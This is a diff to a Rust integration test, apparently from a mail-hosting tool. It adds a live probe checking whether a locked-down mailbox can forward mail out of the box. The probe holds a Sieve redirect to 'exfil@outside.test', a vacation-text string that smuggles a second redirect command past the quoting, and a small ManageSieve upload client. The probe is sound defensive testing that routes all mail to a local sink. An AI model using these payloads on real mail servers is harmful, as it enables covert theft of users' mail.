@@ -295,17 +295,12 @@ fn plant_as_user(user: &StalwartClient, account: &str, name: &str, src: &str, ac
     raw(user, &[CORE, SIEVE], "SieveScript/set", args)
 }
 
-#[test]
-#[ignore = "live: run as root on the disposable mailprobe box (installs and wipes Stalwart)"]
-fn live_sieve_lockdown_probe() {
-    let v = std::env::var("K2_MAILPROBE_STALWART")
-        .expect("set K2_MAILPROBE_STALWART to the staged version (0.16.10 | 0.16.25)");
+/// K2's own enable flow against a fresh store on the probe box, plus
+/// every outbound route pointed at Mailpit (nothing reaches the wire).
+/// Returns the service-key client and the sink forwarder child.
+fn install_fixture(v: &str, rep: &mut Report) -> (StalwartClient, std::process::Child) {
     let bin = format!("/opt/stalwart-{v}/stalwart");
     assert!(std::path::Path::new(&bin).exists(), "{bin} is not staged");
-    let mut rep = Report::default();
-    let tag = format!("{}-{}", v.replace('.', ""), std::process::id());
-    println!("== Stalwart {v} (run {tag}) ==");
-
     // ── Fixture: K2's own enable flow, against a fresh store ─────────
     must(sh(
         "systemctl stop stalwart 2>/dev/null; systemctl disable stalwart 2>/dev/null; \
@@ -341,7 +336,7 @@ fn live_sieve_lockdown_probe() {
     rep.info("fixture", format!("K2 enable flow done on {v}; service account {svc_id}"));
 
     // Every outbound message → Mailpit (nothing can reach the wire).
-    let (sink_ip, sink_port, mut sink) = start_sink_forwarder();
+    let (sink_ip, sink_port, sink) = start_sink_forwarder();
     let route = registry(&c, "x:MtaRoute/set", json!({ "create": { "mp": {
         "@type": "Relay", "name": "mailpit", "description": "probe sink",
         "address": sink_ip, "port": sink_port, "protocol": "smtp", "implicitTls": false } } }))
@@ -370,6 +365,18 @@ fn live_sieve_lockdown_probe() {
     }
     c.action_reload_settings().expect("ReloadSettings after route");
     rep.info("fixture", format!("every outbound route → {sink_ip}:{sink_port} → mailpit 127.0.0.1:1025"));
+    (c, sink)
+}
+
+#[test]
+#[ignore = "live: run as root on the disposable mailprobe box (installs and wipes Stalwart)"]
+fn live_sieve_lockdown_probe() {
+    let v = std::env::var("K2_MAILPROBE_STALWART")
+        .expect("set K2_MAILPROBE_STALWART to the staged version (0.16.10 | 0.16.25)");
+    let mut rep = Report::default();
+    let tag = format!("{}-{}", v.replace('.', ""), std::process::id());
+    println!("== Stalwart {v} (run {tag}) ==");
+    let (c, mut sink) = install_fixture(&v, &mut rep);
 
     let did = c.domain_query_id(DOMAIN).expect("domain query").expect("example.test exists");
     let mk = |name: &str, perms: Option<&Value>| -> Result<(String, String), String> {
@@ -594,4 +601,261 @@ fn live_sieve_lockdown_probe() {
     let _ = sink.kill();
     println!("== Stalwart {v}: {} failed check(s): {:?} ==", rep.failed.len(), rep.failed);
     assert!(rep.failed.is_empty(), "failed on Stalwart {v}: {:?}", rep.failed);
+}
+
+// ── Forwarding-gap probe (email notifications part 2, slice 0) ──────
+
+/// A tiny ManageSieve client (STARTTLS, AUTHENTICATE PLAIN, PUTSCRIPT,
+/// SETACTIVE, LISTSCRIPTS). The login and the script come from the
+/// environment, never argv. Prints one `VERB: <last line>` per step.
+const MANAGESIEVE_CLIENT: &str = r#"
+import base64, os, socket, ssl
+port = int(os.environ["MS_PORT"])
+s = socket.create_connection(("127.0.0.1", port), timeout=20)
+f = s.makefile("rb")
+def resp(f):
+    lines = []
+    while True:
+        l = f.readline()
+        if not l:
+            raise SystemExit("EOF after %r" % lines)
+        lines.append(l.decode(errors="replace").rstrip())
+        u = l.upper()
+        if u.startswith(b"OK") or u.startswith(b"NO") or u.startswith(b"BYE"):
+            return lines
+def cmd(sock, f, data):
+    sock.sendall(data)
+    return resp(f)
+print("GREETING:", resp(f)[-1])
+print("STARTTLS:", cmd(s, f, b"STARTTLS\r\n")[-1])
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+s = ctx.wrap_socket(s, server_hostname="mail.example.test")
+f = s.makefile("rb")
+print("CAPS:", resp(f)[-1])
+tok = base64.b64encode(("\0" + os.environ["MS_USER"] + "\0" + os.environ["MS_PASS"]).encode()).decode()
+print("AUTH:", cmd(s, f, ('AUTHENTICATE "PLAIN" "%s"\r\n' % tok).encode())[-1])
+body = os.environ["MS_SCRIPT"].encode()
+print("PUTSCRIPT:", cmd(s, f, b'PUTSCRIPT "gap" {%d+}\r\n' % len(body) + body + b"\r\n")[-1])
+print("SETACTIVE:", cmd(s, f, b'SETACTIVE "gap"\r\n')[-1])
+print("LISTSCRIPTS:", " | ".join(cmd(s, f, b"LISTSCRIPTS\r\n")))
+try:
+    cmd(s, f, b"LOGOUT\r\n")
+except SystemExit:
+    pass
+"#;
+
+/// Run [`MANAGESIEVE_CLIENT`] as `user` (secret via env only).
+fn managesieve(port: u16, user: &str, pass: &str, script: &str) -> String {
+    let out = std::process::Command::new("python3")
+        .args(["-c", MANAGESIEVE_CLIENT])
+        .env("MS_PORT", port.to_string())
+        .env("MS_USER", user)
+        .env("MS_PASS", pass)
+        .env("MS_SCRIPT", script)
+        .output()
+        .expect("spawn python3");
+    format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr))
+}
+
+fn step_ok(out: &str, verb: &str) -> bool {
+    out.lines().any(|l| l.starts_with(&format!("{verb}: OK")))
+}
+
+/// Did a registry `/set` write nothing?
+fn wrote_nothing(out: &Result<Value, String>) -> bool {
+    match out {
+        Err(_) => true,
+        Ok(a) => {
+            let has = |k: &str| a.get(k).and_then(|v| v.as_object()).is_some_and(|m| !m.is_empty());
+            !has("created") && !has("updated")
+        }
+    }
+}
+
+/// Every door a mailbox login (password, app password, or an API key
+/// it mints itself) could use to forward its mail out of the box,
+/// with the Sieve lockdown applied the way main applies it. Read the
+/// `[FAIL]` lines as "this door is open"; `[INFO]` lines are facts.
+#[test]
+#[ignore = "live: run as root on the disposable mailprobe box (installs and wipes Stalwart)"]
+fn live_forward_gap_probe() {
+    let v = std::env::var("K2_MAILPROBE_STALWART")
+        .expect("set K2_MAILPROBE_STALWART to the staged version (0.16.10 | 0.16.25)");
+    let mut rep = Report::default();
+    let tag = format!("fg{}-{}", v.replace('.', ""), std::process::id());
+    println!("== forwarding gap, Stalwart {v} (run {tag}) ==");
+    let (c, mut sink) = install_fixture(&v, &mut rep);
+    let did = c.domain_query_id(DOMAIN).expect("domain query").expect("example.test exists");
+    let lock = sl::mint_permissions(None).expect("lock perms");
+    let mk = |name: &str, perms: &Value| -> (String, String) {
+        let pw = super::secrets::generate_secret().expect("secret");
+        let id = c
+            .account_create(name, &did, &pw, 1_073_741_824, 10_000, Some(perms))
+            .unwrap_or_else(|e| panic!("mint {name}: {e}"));
+        (id, pw)
+    };
+    let (gina, gina_pw) = mk("gina", &lock);
+    let (hank, _) = mk("hank", &lock);
+    let gina_addr = format!("gina@{DOMAIN}");
+    let gina_user = StalwartClient::new_basic(STALWART_MGMT_URL, gina_addr.clone(), gina_pw.clone());
+    let redirect = "redirect \"exfil@outside.test\";\n";
+    let refused_or_403 = |r: Result<(String, Value), String>| match r {
+        Ok((n, a)) => (refused(&n, &a), format!("{n} {a}")),
+        Err(e) => (e.contains("403") || e.contains("orbidden"), e),
+    };
+
+    // ── G1 JMAP SieveScript/set with the mailbox password ────────────
+    let (ok, d) = refused_or_403(plant_as_user(&gina_user, &gina, "g1", redirect, true));
+    rep.check("G1 password: JMAP SieveScript/set refused", ok, d);
+
+    // ── G2 an app password K2 (or a mail-manage agent) minted ────────
+    let ap = c.app_password_create(&gina, "probe-g2").expect("app password");
+    let gina_app = StalwartClient::new_basic(STALWART_MGMT_URL, gina_addr.clone(), ap.secret.clone());
+    let (ok, d) = refused_or_403(plant_as_user(&gina_app, &gina, "g2", redirect, true));
+    rep.check("G2 app password: JMAP SieveScript/set refused", ok, d);
+
+    // ── G3 an API key the mailbox mints for itself ───────────────────
+    for (label, perms) in [
+        ("Inherit", json!({ "@type": "Inherit" })),
+        ("Replace", json!({ "@type": "Replace", "permissions": {
+            "jmapSieveScriptCreate": true, "jmapSieveScriptUpdate": true, "authenticate": true } })),
+    ] {
+        let made = registry(&gina_user, "x:ApiKey/set", json!({ "accountId": gina, "create": { "k": {
+            "description": format!("probe-g3-{label}"), "permissions": perms, "allowedIps": {} } } }));
+        let secret = made.as_ref().ok().and_then(|a| a["created"]["k"]["secret"].as_str().map(str::to_string));
+        match secret {
+            Some(sec) => {
+                rep.info("G3 self-minted API key", format!("{label}: the mailbox CAN mint its own API key (lane k2/mail-apikeys)"));
+                let keyed = StalwartClient::new(STALWART_MGMT_URL, sec);
+                let (ok, d) = refused_or_403(plant_as_user(&keyed, &gina, "g3", redirect, true));
+                rep.check(&format!("G3 API key ({label}): SieveScript/set refused"), ok, d);
+            }
+            None => rep.info("G3 self-minted API key", format!("{label}: not minted: {made:?}")),
+        }
+    }
+
+    // ── G4 registry writes as the mailbox ────────────────────────────
+    let tries = [
+        ("x:SieveUserScript/set", json!({ "create": { "s": { "name": "gap", "contents": redirect } } })),
+        ("x:Account/set", json!({ "update": { gina.clone(): { "description": "probe" } } })),
+        ("x:SieveUserInterpreter/set", json!({ "update": { "singleton": { "maxRedirects": 9 } } })),
+        ("x:MtaRoute/set", json!({ "create": { "r": { "@type": "Relay", "name": "gap",
+            "address": "127.0.0.1", "port": 1025, "protocol": "smtp", "implicitTls": false } } })),
+    ];
+    for (method, args) in tries {
+        let out = registry(&gina_user, method, args);
+        rep.check(&format!("G4 mailbox {method} refused"), wrote_nothing(&out), format!("{out:?}"));
+    }
+    match registry(&gina_user, "x:MaskedEmail/set", json!({ "create": { "m": {
+        "enabled": true, "accountId": gina, "email": "m@outside.test" } } })) {
+        Ok(a) => rep.info("G4 x:MaskedEmail/set (an inbound alias, not a forward)", a.to_string()),
+        Err(e) => rep.info("G4 x:MaskedEmail/set", e),
+    }
+
+    // ── G5 VacationResponse/set: escaping, and its effect on K2's script ─
+    sieve_user::patch_user_sieve(&c, &gina, sieve_user::SievePatch::SetForward(sieve_user::ForwardBlock {
+        dest: format!("hank@{DOMAIN}"),
+        keep: true,
+    }))
+    .expect("K2 forward gina → hank");
+    let inj = "back\"; redirect \"inj@outside.test\"; #";
+    let vr = raw(&gina_user, &[CORE, "urn:ietf:params:jmap:vacationresponse"], "VacationResponse/set", json!({
+        "accountId": gina, "update": { "singleton": { "isEnabled": true, "subject": inj, "textBody": inj } } }));
+    rep.info("G5 VacationResponse/set (mailbox password)", format!("{vr:?}"));
+    let scripts = |id: &str| {
+        c.sieve_scripts_list(id)
+            .expect("list")
+            .iter()
+            .map(|s| format!("{}{}", s.name, if s.is_active { "*" } else { "" }))
+            .collect::<Vec<_>>()
+    };
+    rep.info("G5 gina's scripts after vacation", format!("{:?}", scripts(&gina)));
+    let m5 = format!("g5-{tag}@origin.test");
+    smtp_send(&gina_addr, &m5, "probe g5").expect("send g5");
+    let got = wait_for(45, || delivered(&c, &gina, &m5));
+    std::thread::sleep(Duration::from_secs(10));
+    rep.check(
+        "G5 vacation text can't inject a redirect (the original never leaves)",
+        got && !mailpit_has(&m5, "inj@outside.test"),
+        format!("delivered={got}; sink copy={}", mailpit_has(&m5, "inj@outside.test")),
+    );
+    rep.info("G5 K2 forward gina → hank while vacation is on", format!("hank got it={}", delivered(&c, &hank, &m5)));
+    let _ = raw(&gina_user, &[CORE, "urn:ietf:params:jmap:vacationresponse"], "VacationResponse/set",
+        json!({ "accountId": gina, "update": { "singleton": { "isEnabled": false } } }));
+
+    // ── G6 ManageSieve ──────────────────────────────────────────────
+    let listening = sh("ss -ltnH 'sport = :4190'").unwrap_or_default();
+    rep.check("G6 no ManageSieve listener after K2's enable flow", listening.trim().is_empty(), format!("ss: {listening:?}"));
+    // Simulate a box where someone re-added it (loopback only).
+    let made = registry(&c, "x:NetworkListener/set", json!({ "create": { "ms": {
+        "name": "probe-sieve", "bind": { "127.0.0.1:4190": true }, "protocol": "manageSieve",
+        "useTls": true, "tlsImplicit": false } } }));
+    let ms_id = made.as_ref().ok().and_then(|a| a["created"]["ms"]["id"].as_str().map(str::to_string));
+    match ms_id {
+        None => rep.info("G6 probe listener", format!("not created: {made:?}")),
+        Some(ms_id) => {
+            restart();
+            retry("service key ping after listener", 90, || c.ping());
+            let up = wait_for(30, || sh("ss -ltnH 'sport = :4190'").is_ok_and(|o| !o.trim().is_empty()));
+            rep.info("G6 probe listener on 127.0.0.1:4190", format!("listening={up}"));
+            // (a) a mailbox with today's lock (JMAP writes only).
+            let out = managesieve(4190, &gina_addr, &gina_pw, redirect);
+            rep.info("G6a ManageSieve as gina (JMAP-only lock)", out.replace('\n', " / "));
+            rep.check(
+                "G6a ManageSieve PUTSCRIPT refused with today's lock",
+                !step_ok(&out, "PUTSCRIPT") && !step_ok(&out, "SETACTIVE"),
+                "see G6a info",
+            );
+            if step_ok(&out, "SETACTIVE") {
+                let m6 = format!("g6-{tag}@origin.test");
+                smtp_send(&gina_addr, &m6, "probe g6").expect("send g6");
+                let left = wait_for(45, || mailpit_has(&m6, "exfil@outside.test"));
+                rep.info("G6a the ManageSieve redirect really forwards", format!("sink copy={left}"));
+            }
+            // (b) the hardened lock: the ManageSieve write names too.
+            let hard = crate::mail::dav::merge_permissions(
+                Some(&lock),
+                &["sievePutScript", "sieveSetActive", "sieveDeleteScript", "sieveRenameScript"],
+                &[],
+            )
+            .expect("merge")
+            .expect("some");
+            let pw = super::secrets::generate_secret().expect("secret");
+            match c.account_create("ivan", &did, &pw, 1_073_741_824, 10_000, Some(&hard)) {
+                Ok(_) => {
+                    rep.info("G6b x:Account/set accepts the ManageSieve names", "yes");
+                    let out = managesieve(4190, &format!("ivan@{DOMAIN}"), &pw, redirect);
+                    rep.info("G6b ManageSieve as ivan (hardened lock)", out.replace('\n', " / "));
+                    rep.check(
+                        "G6b hardened lock refuses ManageSieve writes",
+                        !step_ok(&out, "PUTSCRIPT") && !step_ok(&out, "SETACTIVE"),
+                        "see G6b info",
+                    );
+                }
+                Err(e) => rep.check("G6b x:Account/set accepts the ManageSieve names", false, e),
+            }
+            let gone = registry(&c, "x:NetworkListener/set", json!({ "destroy": [ms_id] }));
+            rep.info("G6 probe listener removed", format!("{gone:?}"));
+            restart();
+            retry("service key ping after removal", 90, || c.ping());
+        }
+    }
+
+    // ── G7 end to end: nothing a mailbox did forwards new mail ───────
+    rep.info("G7 gina's scripts at the end", format!("{:?}", scripts(&gina)));
+    let m7 = format!("g7-{tag}@origin.test");
+    smtp_send(&gina_addr, &m7, "probe g7").expect("send g7");
+    let got = wait_for(45, || delivered(&c, &gina, &m7));
+    std::thread::sleep(Duration::from_secs(10));
+    rep.check(
+        "G7 no copy of new mail leaves the box",
+        got && !mailpit_has(&m7, "outside.test"),
+        format!("delivered={got}; sink copy={}", mailpit_has(&m7, "outside.test")),
+    );
+
+    let _ = sink.kill();
+    println!("== forwarding gap, Stalwart {v}: {} failed check(s): {:?} ==", rep.failed.len(), rep.failed);
+    assert!(rep.failed.is_empty(), "forwarding gap open on Stalwart {v}: {:?}", rep.failed);
 }
